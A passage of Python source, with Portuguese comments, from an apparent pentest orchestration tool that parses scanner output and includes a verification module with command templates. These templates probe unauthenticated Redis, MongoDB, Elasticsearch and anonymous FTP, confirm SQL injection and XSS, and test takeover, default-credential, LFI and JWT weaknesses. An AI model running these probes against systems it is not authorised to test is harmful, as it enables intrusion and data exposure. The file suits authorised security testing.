def extract_targets(tool_key, raw_output):
    tool = TOOLS.get(tool_key, {})
    output_type = tool.get('output', 'raw')
    lines = [l.strip() for l in raw_output.splitlines() if l.strip()]
    targets = []

    if output_type == 'subdomains':
        for line in lines:
            m = re.match(r'^([\w\.\-]+\.[a-z]{2,})', line)
            if m:
                h = m.group(1)
                targets.append({"value": h, "label": h, "type": "host"})

    elif output_type == 'live_hosts':
        for line in lines:
            m = re.match(r'(https?://[\w\.\-]+(:\d+)?)', line)
            if m:
                h = to_host(m.group(1))
                if h:
                    targets.append({"value": h, "label": m.group(1), "type": "host"})

    elif output_type == 'dirs':
        for line in lines:
            m = re.match(r'^(/[\w\.\-/]+)', line)
            if m:
                targets.append({"value": m.group(1), "label": m.group(1), "type": "path"})

    elif output_type == 'urls':
        for line in lines:
            if line.startswith('http') and '?' in line and len(line) < 300:
                targets.append({"value": line, "label": line[:80], "type": "url"})

    # Tipos informativos (ports/nikto/cves/waf/headers/...) NÃO viram alvos:
    # eles são findings e ficam só no output bruto/relatório. Tratá-los como
    # targets fazia linhas de erro/banner serem injetadas no estágio seguinte.

    seen = set()
    unique = []
    for t in targets:
        if t['value'] not in seen:
            seen.add(t['value'])
            unique.append(t)
    return unique

# ==============================================================================
# PARSER ESTRUTURADO - extrai pivos (assets) e findings normalizados
# ==============================================================================

def _sev(x):
    x = (x or '').strip().lower()
    return x if x in SEVERITIES else 'unknown'

# Mapa de confiança por tool: ferramentas que fazem confirmação automática = 'confirmed'
# Ferramentas com output JSON estruturado = 'likely'; heurística de texto = 'possible'
TOOL_CONFIDENCE = {
    'nuclei':        'likely',    # template matched = forte indicador
    'sqlmap':        'confirmed', # sqlmap só reporta se exploração funcionou
    'dalfox':        'confirmed', # dalfox gera PoC funcional
    'commix':        'confirmed', # commix só reporta execução confirmada
    'wpscan':        'likely',
    'nikto':         'possible',  # nikto tem alto índice de falso positivo
    'nmap':          'likely',
    'testssl':       'likely',
    'httpx':         'likely',
    'whatweb':       'likely',
    'nuclei_dast':   'likely',
}

# ── ATTACK VECTOR MAPPING ──────────────────────────────────────────────────
# ftype → attack vector canônico
FTYPE_TO_VECTOR = {
    'port':          'network_exposure',
    'service':       'network_exposure',
    'host':          'network_exposure',
    'subdomain':     'network_exposure',
    'ip':            'network_exposure',
    'ssl':           'crypto_weakness',
    'cert':          'crypto_weakness',
    'sqli':          'injection',
    'cmdi':          'injection',
    'ssti':          'injection',
    'xxe':           'injection',
    'xss':           'web_client',
    'open_redirect':  'web_client',
    'clickjacking':  'web_client',
    'cors':          'web_client',
    'csrf':          'web_client',
    'auth':          'authentication',
    'jwt':           'authentication',
    'oauth':         'authentication',
    'secret':        'information_disclosure',
    'info':          'information_disclosure',
    'vuln':          'vulnerability',
    'cve':           'vulnerability',
    'rce':           'vulnerability',
    'lfi':           'vulnerability',
    'ssrf':          'vulnerability',
    'cloud':         'cloud_misconfiguration',
    'bypass':        'access_control',
    'idor':          'access_control',
    'privesc':       'access_control',
    'api':           'api_security',
}

# checklist category → attack vectors que a ativam
CHECKLIST_TRIGGER_MAP = {
    'auth':          {'authentication', 'access_control'},
    'injection':     {'injection'},
    'xss':           {'web_client'},
    'crypto':        {'crypto_weakness'},
    'network':       {'network_exposure'},
    'api':           {'api_security'},
    'cloud':         {'cloud_misconfiguration'},
    'jwt_oauth':     {'authentication'},
    'api_security':  {'api_security', 'injection'},
    'general':       None,  # always included
}

def compute_relevant_checklist(findings_list):
    """Retorna apenas as categorias de checklist relevantes para os findings."""
    active_vectors = set()
    for f in findings_list:
        v = FTYPE_TO_VECTOR.get(f.get('ftype', ''), None)
        if v:
            active_vectors.add(v)
    relevant = []
    for cat, triggers in CHECKLIST_TRIGGER_MAP.items():
        if triggers is None or active_vectors & triggers:
            relevant.append(cat)
    return relevant

def group_by_attack_vector(findings_list):
    """Agrupa findings pelo attack vector canônico."""
    groups = {}
    for f in findings_list:
        v = FTYPE_TO_VECTOR.get(f.get('ftype', ''), 'other')
        groups.setdefault(v, []).append(f)
    # Ordenar por severidade dentro de cada grupo
    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
    for v in groups:
        groups[v].sort(key=lambda x: sev_order.get(x.get('severity', 'unknown'), 5))
    return groups

def _confidence_for_tool(tool_key, otype, is_json_confirmed=False):
    """Determina confiança com base na tool e no tipo de output."""
    if is_json_confirmed:
        return TOOL_CONFIDENCE.get(tool_key, 'likely')
    return TOOL_CONFIDENCE.get(tool_key, 'possible')

def _finding(tool, ftype, name, severity, target, evidence='', confidence='possible'):
    return {'tool': tool, 'ftype': ftype, 'name': name, 'severity': severity,
            'target': target or '', 'evidence': evidence or '', 'confidence': confidence}

def _dedup_assets(assets):
    seen, out = set(), []
    for a in assets:
        if a['value'] not in seen:
            seen.add(a['value']); out.append(a)
    return out

_HI_RE  = re.compile(r'cve-\d{4}-\d+|critical|\brce\b|sql injection|injectable|vulnerable', re.I)
_MED_RE = re.compile(r'\bvuln\b|exploit|default cred|traversal|disclos|exposed|admin panel|takeover', re.I)
_LOW_RE = re.compile(r'missing|header|outdated|deprecated|insecure|weak', re.I)
_NOISE_RE = re.compile(r'^[\s_|\\/`*~()\-=+]+$')

def _parse_wafw00f(tool_key, raw_text, target):
    """Parser dedicado para wafw00f — emite 1 finding por WAF detectado."""
    text = strip_ansi(raw_text)
    findings = []
    # Padrão: "The site ... is behind <WAF> WAF."
    # ou:     "is behind <WAF> WAF"
    waf_re = re.compile(r'is behind (.+?)(?:\s+WAF)?[\.,]?$', re.IGNORECASE | re.MULTILINE)
    no_waf_re = re.compile(r'No WAF detected|Generic Detection results', re.IGNORECASE)
    for m in waf_re.finditer(text):
        waf_name = m.group(1).strip().rstrip('.')
        if waf_name:
            findings.append(_finding(tool_key, 'waf', f'WAF Detectado: {waf_name}',
                                     'info', target, f'wafw00f: {waf_name}'))
    if not findings and not no_waf_re.search(text):
        # Sem WAF detectado é só info, sem finding
        pass
    return findings

# Security headers esperados (chave lower -> rotulo)
_SEC_HEADERS = {
    'content-security-policy': 'Content-Security-Policy',
    'x-frame-options': 'X-Frame-Options',
    'strict-transport-security': 'HSTS (Strict-Transport-Security)',
    'x-content-type-options': 'X-Content-Type-Options',
    'referrer-policy': 'Referrer-Policy',
    'permissions-policy': 'Permissions-Policy',
}

def _parse_headers(tool_key, raw_text, target):
    """Trata headers HTTP como CONTEXTO. Emite finding apenas para:
    security headers AUSENTES (agregado, low), cookies sem Secure/HttpOnly (low),
    e Server/X-Powered-By que exponha versao (info). Headers comuns
    (Content-Type, Date, Connection, etc.) NAO viram finding."""
    text = strip_ansi(raw_text)
    present, cookies = {}, []
    status_seen = False
    for line in text.splitlines():
        l = line.strip()
        if not l:
            continue
        if re.match(r'^HTTP/\d', l, re.I):
            status_seen = True
            continue
        m = re.match(r'^([A-Za-z0-9\-]+):\s*(.*)$', l)
        if not m:
            continue
        key, val = m.group(1).lower(), m.group(2).strip()
        if key == 'set-cookie':
            cookies.append(val)
        present[key] = val
    # Sem headers parseados (erro/timeout) -> nada
    if not present and not status_seen:
        return []
    out = []
    missing = [lbl for k, lbl in _SEC_HEADERS.items() if k not in present]
    if missing:
        out.append(_finding(tool_key, 'headers',
            'Security headers ausentes: ' + ', '.join(missing), 'low', target,
            'Headers de seguranca nao presentes na resposta: ' + ', '.join(missing)))
    for c in cookies:
        cl = c.lower()
        flags = [f for f, tok in (('Secure', 'secure'), ('HttpOnly', 'httponly'))
                 if tok not in cl]
        if flags:
            cname = c.split('=', 1)[0].strip()
            out.append(_finding(tool_key, 'headers',
                f"Cookie sem {'/'.join(flags)}: {cname}", 'low', target, c[:200]))
    for hk in ('server', 'x-powered-by'):
        v = present.get(hk, '')
        if v and re.search(r'\d', v):
            out.append(_finding(tool_key, 'headers',
                f'{hk.title()} expoe versao: {v}', 'info', target, f'{hk}: {v}'))
    return out

# Ruido do nikto: banners, alvo, tempos, erros e separadores (nao sao findings)
_NIKTO_NOISE_RE = re.compile(
    r'^[-+]?\s*Nikto v|'
    r'^[-+]?\s*Target (IP|Hostname|Port|Site)\s*:|'
    r'^[-+]?\s*(Start|End) Time\s*:|'
    r'^[-+]?\s*\d+\s+host\(s\) tested|'
    r'^[-+]?\s*\d+\s+(item|error)\(s\)|'
    r'item\(s\) reported on remote host|'
    r'^[-+]?\s*\d+\s+requests?\s*:|'
    r'^[-+]?\s*ERROR\s*:|'
    r'^[-+]?\s*No CGI Directories|'
    r'^[-+]?\s*Scan terminated|'
    r'^-{3,}$',
    re.I)

# Ruido por otype: linhas operacionais/banners que nao sao vulnerabilidades.
# Aplicado ANTES da classificacao de severidade em _text_findings.
_TOOL_NOISE = {
    # sqlmap: [INFO]/[WARNING] operacionais, CRITICAL de rede, banner ASCII, prompts
    'sqli': re.compile(
        r'^\s*\[[\*!]\]|'                          # [*] starting/ending, [!] legal
        r'^_+\s*$|^__H__|^___ ___\[|^\|[_\- ]|'   # ASCII art
        r'\{[\d\.]+#\w+\}|'                         # versao tool: {1.10.5#stable}
        r'legal disclaimer|starting @|ending @|'
        r'\[INFO\](?!.*(?:injectable|vulnerable|injection point))|'
        r'\[WARNING\](?!.*(?:injectable|vulnerable))|'
        r'all tested parameters do not appear|not injectable|not vulnerable|'
        r'\[CRITICAL\].*(?:timed out|connection|Unable)|'
        r'got a 3\d\d redirect|'
        r'you have not declared cookie|'
        r'do you want to (follow|use those|ignore)',
        re.I
    ),
    # commix: banner, copyright, linhas [info]/[warning]/[critical] operacionais, prompts
    'cmdi': re.compile(
        r'^\s*\+--|'                               # separadores +--
        r'Automated All-in-One|'
        r'Copyright|Legal disclaimer|'
        r'^_+|^\^|^\s*___ ___|'                   # ASCII art
        r'\[info\].*(?:Testing connection|Following redirect|Checking whether|Skipping further)|'
        r'^\s*\[[\*]\].*(?:Testing connection|Checking|Skipping)|'
        r'\[warning\]|'
        r'\[critical\].*(?:timed out|Unable to connect)|'
        r'Got a 3\d\d redirect|'
        r'You have not declared|'
        r'Do you want to|'
        r'HTTP error code.*could interfere',
        re.I
    ),
    # nmap/masscan: cabecalhos, preamble, linhas de script NSE
    'ports': re.compile(
        r'^Starting Nmap|^Nmap scan report|^Host is up|'
        r'^Not shown:|^PORT\s+STATE|'
        r'^\|[_\s]|'                               # linhas NSE: |_http-server-header
        r'^MAC Address:|^Service Info:|^OS (?:details|CPE):|'
        r'^Network Distance|^TRACEROUTE|^Aggressive OS',
        re.I
    ),
}

def _text_findings(tool_key, otype, lines):
    if otype not in ('ports','nikto','cves','misconfig','sqli','xss','cmdi',
                     'tech_vuln','wordpress'):
        return []  # 'waf' removido — tratado por _parse_wafw00f
    out = []
    for line in lines:
        if len(out) >= 120:
            break
        l = line.strip()
        if len(l) < 6: continue
        # Rejeitar qualquer resíduo de ANSI mesmo após strip
        if re.match(r'\[\d+;?\d*m', l): continue
        if l.lower().startswith('error:'): continue
        if _NOISE_RE.match(l): continue
        if not re.search(r'[a-zA-Z]', l): continue
        _tnoise = _TOOL_NOISE.get(otype)
        if _tnoise and _tnoise.search(l): continue
        if   _HI_RE.search(l):  sev = 'high'
        elif _MED_RE.search(l): sev = 'medium'
        elif _LOW_RE.search(l): sev = 'low'
        else:                   sev = 'info'
        out.append(_finding(tool_key, otype, l[:160], sev, '', l[:300]))
    return out

# ══════════════════════════════════════════════════════════════════════════════
# MODULO DE VERIFICACAO / EXPLORACAO
# Pega findings likely/possible e os verifica ativamente, gerando evidencia/PoC.
# So roda com acao explicita do usuario (endpoint POST). Nunca automatico.
# ══════════════════════════════════════════════════════════════════════════════

VERIFY_TIMEOUT    = 60     # segundos por verificacao
VERIFY_MAX_OUTPUT = 2000   # chars de evidencia salvos

# Cada entrada e avaliada em ordem; o primeiro 'match' (regex em name+ftype+tool+evidence)
# vence. 'cmd' e template em LISTA (subprocess sem shell -> sem injecao de shell).
# 'needs' = parametros obrigatorios. 'success' = regex que, se casar no output,
# eleva a confidence para 'confirmed'.
VERIFY_MAP = [
    {
        'id': 'redis_unauth', 'match': r'redis',
        'tool': 'redis-cli', 'needs': ['host'], 'default_port': '6379',
        'cmd': ['redis-cli', '-h', '{host}', '-p', '{port}', '--no-auth-warning', 'INFO', 'server'],
        'success': r'redis_version|# Server|uptime_in_seconds',
        'desc': 'Conecta no Redis e le INFO server sem autenticacao',
    },
    {
        'id': 'mongodb_exposed', 'match': r'mongo',
        'tool': 'mongosh', 'needs': ['host'], 'default_port': '27017',
        'cmd': ['mongosh', '--host', '{host}', '--port', '{port}', '--quiet',
                '--eval', 'JSON.stringify(db.adminCommand({listDatabases:1}))'],
        'success': r'"databases"|"ok"\s*:\s*1|totalSize',
        'desc': 'Lista databases via adminCommand sem autenticacao',
    },
    {
        'id': 'elasticsearch_open', 'match': r'elastic',
        'tool': 'curl', 'needs': ['host'], 'default_port': '9200',
        'cmd': ['curl', '-s', '--max-time', '15', 'http://{host}:{port}/_cat/indices?v'],
        'success': r'health\s+status\s+index|\b(green|yellow|red)\b|docs\.count',
        'desc': 'Lista indices Elasticsearch expostos',
    },
    {
        'id': 'ftp_anon', 'match': r'ftp.*anon|anon.*ftp|ftp anonymous',
        'tool': 'curl', 'needs': ['host'], 'default_port': '21',
        'cmd': ['curl', '-s', '--max-time', '15', 'ftp://{host}/',
                '--user', 'anonymous:test@test.com', '-l'],
        'success': r'.+',
        'desc': 'Login FTP anonimo e listagem de diretorio',
    },
    {
        'id': 'sqli', 'match': r'sql\s*inj|sqli|injectable',
        'tool': 'sqlmap', 'needs': ['url'],
        'cmd': ['sqlmap', '-u', '{url}', '--batch', '--level', '2', '--risk', '1',
                '--smart', '--flush-session', '--disable-coloring', '--timeout', '10'],
        'success': r'is vulnerable|is .* injectable|sqlmap identified|the back-end DBMS is',
        'desc': 'Confirma SQLi com sqlmap (batch, level 2)',
    },
    {
        'id': 'xss', 'match': r'\bxss\b|cross.?site.?script',
        'tool': 'dalfox', 'needs': ['url'],
        'cmd': ['dalfox', 'url', '{url}', '--no-color', '--silence', '--timeout', '20'],
        'success': r'\[POC\]|\[V\]|triggered|reflected|\[VULN\]',
        'desc': 'Gera PoC de XSS com dalfox',
    },
    {
        'id': 'cors', 'match': r'\bcors\b|cross.?origin',
        'tool': 'corsy', 'needs': ['url'],
        'cmd': ['corsy', '-u', '{url}'],
        'success': r'Vulnerable|misconfig|reflect|wildcard',
        'desc': 'Testa misconfiguracao de CORS com corsy',
    },
    {
        'id': 'takeover', 'match': r'takeover',
        'tool': 'nuclei', 'needs': ['url'],
        'cmd': ['nuclei', '-u', '{url}', '-tags', 'takeover', '-silent', '-nc'],
        'success': r'\[.*takeover|\bhigh\b|\bcritical\b|fingerprint',
        'desc': 'Confirma subdomain takeover com templates nuclei',
    },
    {
        'id': 'default_creds', 'match': r'default.?cred|default.?login|default.?pass',
        'tool': 'nuclei', 'needs': ['url'],
        'cmd': ['nuclei', '-u', '{url}', '-tags', 'default-login', '-silent', '-nc'],
        'success': r'\[.*default-login|valid|success',
        'desc': 'Testa credenciais padrao com nuclei',
    },
    {
        'id': 'lfi', 'match': r'\blfi\b|local file inclus|path.?travers|directory.?travers',
        'tool': 'nuclei', 'needs': ['url'],
        'cmd': ['nuclei', '-u', '{url}', '-tags', 'lfi', '-silent', '-nc'],
        'success': r'\[.*lfi|root:.*:0:0:|\bhigh\b|\bcritical\b',
        'desc': 'Confirma LFI com templates nuclei',
    },
    {
        'id': 'jwt_weak', 'match': r'\bjwt\b|json web token',
        'tool': 'jwt_tool', 'needs': ['token'],
        'cmd': ['jwt_tool', '{token}', '-M', 'at'],
        'success': r'weak|cracked|None algorithm|signature|vulnerab',
        'desc': 'Analisa fragilidades do JWT com jwt_tool',
    },
]

_JWT_RE  = re.compile(r'eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]+')
_PORT_TAG_RE = re.compile(r'\b(\d{2,5})/(?:tcp|udp)\b', re.I)

def _safe_host_only(raw):
    """Extrai apenas o hostname/IP (sem porta), validado. None se invalido."""
    h = to_host(raw)
    if not h:
        return None
    return h.split(':')[0]

def match_verifier(finding):
    """Retorna a entrada VERIFY_MAP que casa com o finding, ou None."""
    hay = ' '.join([
        str(finding.get('name', '')), str(finding.get('ftype', '')),
        str(finding.get('tool', '')), str(finding.get('evidence', '')),
    ]).lower()
    for entry in VERIFY_MAP:
        if re.search(entry['match'], hay, re.I):
            return entry
    return None

def _verify_params(finding, entry):
    """Extrai host/port/url/token do finding para preencher o template."""
    target   = str(finding.get('target', '') or '')
    name     = str(finding.get('name', '') or '')
    evidence = str(finding.get('evidence', '') or '')

    host = _safe_host_only(target)

    # URL: preserva querystring (importante para sqli/xss)
    url = None
    if target.lower().startswith('http'):
        url = to_url(target)
    if not url and host:
        url = f'http://{host}'

    # Porta: explicita em target (host:porta) > tag NN/tcp em name/evidence > default
    port = entry.get('default_port', '80')
    m = re.search(r':(\d{2,5})(?:/|$|\b)', target)
    if m:
        port = m.group(1)
    else:
        m2 = _PORT_TAG_RE.search(f'{name} {evidence}')
        if m2:
            port = m2.group(1)

    # Token JWT
    token = None
    mt = _JWT_RE.search(f'{target} {name} {evidence}')
    if mt:
        token = mt.group(0)

    return {'host': host, 'port': port, 'url': url, 'token': token}

def run_verification(finding):
    """
    Executa a verificacao ativa de um finding.
    Retorna dict: {ok, verified, tool, cmd, output, returncode, error?, confidence?}
    NUNCA usa shell=True. Timeout e truncamento aplicados.
    """
    proxy = dict(active_proxy)
    if proxy.get('profile', 'none') != 'none' or proxy.get('http') or proxy.get('socks'):
        return {'ok': False, 'error': 'Verificação ativa sem suporte a proxy; execução bloqueada. Para o lab local, selecione Sem proxy.'}
    entry = match_verifier(finding)
    if not entry:
        return {'ok': False, 'error': 'Nenhum verificador disponivel para este finding'}

    tool_bin = entry['tool']
    if not shutil.which(tool_bin):
        return {'ok': False, 'tool': tool_bin,
                'error': f"Ferramenta '{tool_bin}' nao instalada no sistema"}

    params = _verify_params(finding, entry)
    for need in entry.get('needs', []):
        if not params.get(need):
            return {'ok': False, 'tool': tool_bin,
                    'error': f"Parametro obrigatorio ausente: {need}"}

    # Monta cmd (list-form, sem shell)
    cmd = []
    for part in entry['cmd']:
        p = part
        for k in ('host', 'port', 'url', 'token'):
            v = params.get(k)
            if v is not None:
                p = p.replace('{' + k + '}', str(v))
        cmd.append(p)

    # Defesa em profundidade: rejeita qualquer placeholder nao resolvido
    for p in cmd:
        if re.search(r'\{(host|port|url|token)\}', p):
            return {'ok': False, 'tool': tool_bin, 'cmd': cmd,
                    'error': 'Template com placeholder nao resolvido'}

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=VERIFY_TIMEOUT, env=proxy_env(proxy=proxy),
        )
        out = strip_ansi((result.stdout or '') + (result.stderr or ''))
        out = out.strip()[:VERIFY_MAX_OUTPUT]
        verified = bool(re.search(entry['success'], out, re.I))
        return {
            'ok': True, 'verified': verified,
            'tool': tool_bin, 'verify_id': entry['id'],
            'cmd': cmd, 'output': out, 'returncode': result.returncode,
            'confidence': 'confirmed' if verified else finding.get('confidence', 'possible'),
        }
    except subprocess.TimeoutExpired:
        return {'ok': False, 'tool': tool_bin, 'cmd': cmd,
                'error': f'Timeout ({VERIFY_TIMEOUT}s) excedido'}
    except Exception as e:
        return {'ok': False, 'tool': tool_bin, 'cmd': cmd, 'error': str(e)}


def parse_output(tool_key, raw):
    """Retorna (assets, findings). assets = pivos host/url/path para o pipeline."""
    tool = TOOLS.get(tool_key, {})
    otype = tool.get('output', 'raw')
    is_json = tool.get('json', False)
    assets, findings = [], []
    raw   = strip_ansi(raw)
    lines = [l for l in raw.splitlines() if l.strip()]

    if is_json:
        for ln in lines:
            ln = ln.strip()
            if not ln.startswith('{'): continue
            try: o = json.loads(ln)
            except Exception: continue

            if otype == 'live_hosts':
                url = o.get('url') or o.get('input') or ''
                host = to_host(o.get('host') or url)
                if host: assets.append({'value': host, 'label': url or host, 'type': 'host'})
                sc = o.get('status_code') or o.get('status-code') or ''
                title = o.get('title') or ''
                findings.append(_finding(tool_key, 'http', f"HTTP {sc} {title}".strip(), 'info', host or url, url))
                techs = o.get('tech') or o.get('technologies') or []
                for t in (techs if isinstance(techs, list) else [techs]):
                    findings.append(_finding(tool_key, 'tech', str(t), 'info', host or url, url))
            elif otype == 'ports':
                host = to_host(o.get('host') or o.get('ip') or '')
                port = o.get('port')
                if host: assets.append({'value': host, 'label': f"{host}:{port}", 'type': 'host'})
                findings.append(_finding(tool_key, 'port', f"porta {port} aberta", 'info', host, str(port)))
            elif otype == 'subdomains':
                host = to_host(o.get('host') or o.get('input') or '')
                if host: assets.append({'value': host, 'label': host, 'type': 'host'})
            elif otype == 'urls':
                req = o.get('request') or {}
                url = req.get('endpoint') or o.get('endpoint') or o.get('url') or ''
                if url: assets.append({'value': url, 'label': url[:80], 'type': 'url'})
            elif otype in ('cves','misconfig','tech_vuln','xss','sqli'):
                info = o.get('info') or {}
                name = info.get('name') or o.get('template-id') or o.get('templateID') or o.get('template') or 'finding'
                sev = _sev(info.get('severity') or o.get('severity'))
                matched = o.get('matched-at') or o.get('matched_at') or o.get('matched') or o.get('host') or ''
                conf = _confidence_for_tool(tool_key, otype, is_json_confirmed=True)
                findings.append(_finding(tool_key, 'vuln', str(name), sev, to_host(matched) or matched, matched, conf))
        return _dedup_assets(assets), findings

    if otype == 'subdomains':
        for line in lines:
            m = re.match(r'^([\w\.\-]+\.[a-z]{2,})', line)
            if m: assets.append({'value': m.group(1), 'label': m.group(1), 'type': 'host'})
    elif otype == 'live_hosts':
        for line in lines:
            m = re.match(r'(https?://[\w\.\-]+(:\d+)?)', line)
            if m:
                h = to_host(m.group(1))
                if h: assets.append({'value': h, 'label': m.group(1), 'type': 'host'})
    elif otype == 'dirs':
        for line in lines:
            m = re.match(r'^(/[\w\.\-/]+)', line)
            if m:
                assets.append({'value': m.group(1), 'label': m.group(1), 'type': 'path'})
                findings.append(_finding(tool_key, 'path', m.group(1), 'info', m.group(1)))
    elif otype == 'urls':
        for line in lines:
            if line.startswith('http') and '?' in line and len(line) < 300:
                assets.append({'value': line, 'label': line[:80], 'type': 'url'})

    # wafw00f: parser dedicado — 1 finding por WAF, sem ruído de ANSI
    if otype == 'waf':
        findings += _parse_wafw00f(tool_key, raw, assets[0]['value'] if assets else '')
    elif otype == 'headers':
        findings += _parse_headers(tool_key, raw, assets[0]['value'] if assets else '')
    elif otype == 'nikto':
        clean = [l for l in lines if not _NIKTO_NOISE_RE.search(l.strip())]
        findings += _text_findings(tool_key, otype, clean)
    else:
        findings += _text_findings(tool_key, otype, lines)
    return _dedup_assets(assets), findings

def persist_and_emit_findings(scan_id, assets, findings, sid):
    for a in assets:
        db_add_asset(scan_id, a['type'], a['value'])
    new_count = 0
    for f in findings:
        is_new, fid = db_add_finding(scan_id, f['tool'], f['ftype'], f['name'],
                                     f['severity'], f['target'], f['evidence'],
                                     f.get('confidence', 'possible'))
        if is_new:
            new_count += 1
            socketio.emit('finding', {'scan_id': scan_id, 'id': fid, **f}, room=sid)
    if new_count:
        socketio.emit('findings_summary', {'scan_id': scan_id, **db_summary(scan_id)}, room=sid)
    return new_count

def _is_stream_noise(line_clean):
    """Suprime linhas de banner/arte-ASCII/preamble antes de emitir tool_output.
    Recebe a linha JA com ANSI removido. Nao afeta output_lines (parser ainda ve tudo)."""
    l = line_clean.strip()
    if len(l) < 2:
        return True
    # Arte ASCII / separadores graficos puros
    if re.match(r'^[_\-=|/\\+~*` .]{4,}$', l):
        return True
    # wafw00f: banner decorativo e mensagens de status/erro internas
    if re.search(
        r'W00f!|404 Hack Not Found|405 Not Allowed|403 Forbidden|'
        r'502 Bad Gateway|500 Internal Error|'
        r'WAFW00F.*v\d|Web Application Firewall Fingerprinting Toolkit',
        l, re.I
    ):
        return True
    # nmap: preamble e footer informativos
    if re.search(r'^Starting Nmap|Service detection performed\. Please report|^Nmap done:', l, re.I):
        return True
    # sqlmap/commix: linha de versao {x.y.z#stable}, copyright, legal
    if re.search(r'\{[\d\.]+#\w+\}|^\s*\+--+\s*$', l):
        return True
    # Linhas so com simbolos graficos (arte de tool)
    if re.match(r'^[\s_|/\\*`~(){}\[\]\-=+.,"\'<>^%@#$&;:!?]+$', l):
        return True
    return False

def _safe_slug(s, maxlen=40):
    """Converte string em slug seguro para nome de arquivo/pasta."""
    s = re.sub(r'^https?://', '', s)
    s = re.sub(r'[^a-zA-Z0-9._-]', '_', s)
    s = re.sub(r'_+', '_', s).strip('_')
    return s[:maxlen]

def _scan_output_dir(scan_id):
    """Retorna o diretório de saída do scan (cria se necessário)."""
    info = active_scans.get(scan_id, {})
    d = info.get('output_dir')
    if d:
        return Path(d)
    # Monta a partir do target do scan
    target = info.get('target', 'unknown')
    domain_slug = _safe_slug(to_domain(target) or to_host(target) or target, 50)
    scan_dir = RESULTS_DIR / domain_slug / scan_id
    scan_dir.mkdir(parents=True, exist_ok=True)
    if scan_id in active_scans:
        active_scans[scan_id]['output_dir'] = str(scan_dir)
    return scan_dir

def _save_tool_output(scan_id, tool_key, raw_target, raw_output):
    """Salva o output bruto de uma tool em arquivo numerado no diretório do scan."""
    info = active_scans.get(scan_id, {})
    step = info.get('step_n', 0) + 1
    if scan_id in active_scans:
        active_scans[scan_id]['step_n'] = step
    out_dir = _scan_output_dir(scan_id)
    # Inclui slug do target no nome só quando difere do alvo inicial
    initial = info.get('target', '')
    target_slug = ''
    if raw_target and _safe_slug(raw_target) != _safe_slug(initial):
        target_slug = '__' + _safe_slug(raw_target, 30)
    fname = f"{step:02d}_{tool_key}{target_slug}.txt"
    try:
        (out_dir / fname).write_text(raw_output, encoding='utf-8', errors='replace')
    except Exception:
        pass   # nunca deixar falha de I/O quebrar o scan

def run_tool_sequential(scan_id, tool_key, raw_target, sid, request_context=None, outcome=None):
    if outcome is not None:
        outcome.update(status='skipped', reason='Ferramenta indisponível ou alvo inválido')
    tool = TOOLS.get(tool_key)
    if not tool:
        socketio.emit('tool_skip', {'scan_id':scan_id,'tool':tool_key,
            'reason':'Tool não existe'}, room=sid)
        return '', []

    if not check_binary(tool['binary']):
        if outcome is not None:
            outcome['reason'] = f"Binário {tool['binary']} não instalado"
        socketio.emit('tool_skip', {'scan_id':scan_id,'tool':tool_key,
            'reason':f"Binário '{tool['binary']}' não encontrado — apt install {tool['binary']} ou go install"}, room=sid)
        return '', []

    proxy = dict(active_proxy)
    cmd, effective_target = build_cmd(tool_key, raw_target, proxy, request_context)
    if cmd is None:
        if outcome is not None:
            outcome['reason'] = effective_target
        socketio.emit('tool_skip', {'scan_id':scan_id,'tool':tool_key,
            'reason':effective_target}, room=sid)
        return '', []

    proxy_info = ""
    if proxy.get('http') or proxy.get('socks'):
        proxy_info = f" [via {proxy.get('profile','proxy')}]"

    timeout = tool.get('timeout', DEFAULT_TOOL_TIMEOUT)

    socketio.emit('tool_start', {
        'scan_id': scan_id, 'tool': tool_key,
        'label': tool['label'],
        'cmd': ' '.join(cmd) if not request_context else f'{tool_key} {effective_target} [contexto GET/POST; valores omitidos]',
        'target': effective_target,
        'proxy': proxy_info,
        'timeout': timeout,
    }, room=sid)

    output_lines = []
    start = time.time()
    timed_out = {'flag': False}

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            env=proxy_env(tool_key, proxy),
            cwd='/tmp',
        )
        if scan_id in active_scans:
            active_scans[scan_id]['processes'][tool_key] = proc

        # Watchdog: mata o processo se estourar o timeout (destrava o readline)
        def _watchdog():
            if proc.poll() is None:
                timed_out['flag'] = True
                try: proc.kill()
                except: pass
                socketio.emit('tool_output', {
                    'scan_id': scan_id, 'tool': tool_key,
                    'line': f"[!] Timeout de {timeout}s atingido — processo finalizado"
                }, room=sid)
        killer = threading.Timer(timeout, _watchdog)
        killer.daemon = True
        killer.start()

        for line in iter(proc.stdout.readline, ''):
            line = line.rstrip()
            if line:
                output_lines.append(line)          # parser ve o raw completo
                clean = strip_ansi(line)
                if not _is_stream_noise(clean):
                    socketio.emit('tool_output', {
                        'scan_id':scan_id, 'tool':tool_key, 'line':clean
                    }, room=sid)
            if active_scans.get(scan_id, {}).get('cancelled'):
                proc.terminate()
                break

        proc.wait()
        killer.cancel()
        elapsed = round(time.time() - start, 1)
        raw = '\n'.join(output_lines)
        _save_tool_output(scan_id, tool_key, raw_target, raw)
        if outcome is not None:
            outcome.update(status='completed' if proc.returncode == 0 and not timed_out['flag'] else 'failed',
                           exit_code=proc.returncode, timed_out=timed_out['flag'])
        assets, findings = parse_output(tool_key, raw)
        persist_and_emit_findings(scan_id, assets, findings, sid)
        extracted = assets

        # Coleta followup tips da tool executada
        followup = tool.get('manual_followup', [])

        _out_dir = str(_scan_output_dir(scan_id))
        socketio.emit('tool_done', {
            'scan_id': scan_id, 'tool': tool_key, 'label': tool['label'],
            'lines': len(output_lines), 'elapsed': elapsed,
            'exit_code': proc.returncode,
            'timed_out': timed_out['flag'],
            'extracted_targets': extracted,
            'manual_followup': followup,
            'output_dir': _out_dir,
        }, room=sid)

        return raw, extracted

    except Exception as e:
        if outcome is not None:
            outcome.update(status='failed', reason=str(e))
        socketio.emit('tool_error', {'scan_id':scan_id,'tool':tool_key,'error':str(e)}, room=sid)
        return '', []

def run_adaptive_web(scan_id, targets, sid):
    scan = active_scans.get(scan_id, {})
    initial = to_url(scan.get('target', '')) or to_http_url(scan.get('target', ''))
    report = {'pages': [], 'forms': [], 'tasks': [], 'pending': [], 'errors': [],
              'limits': {'pages': 12, 'depth': 2, 'jobs': 12}, 'truncated': False,
              'limitations': ['HTML estático: formulários gerados por JavaScript não são analisados',
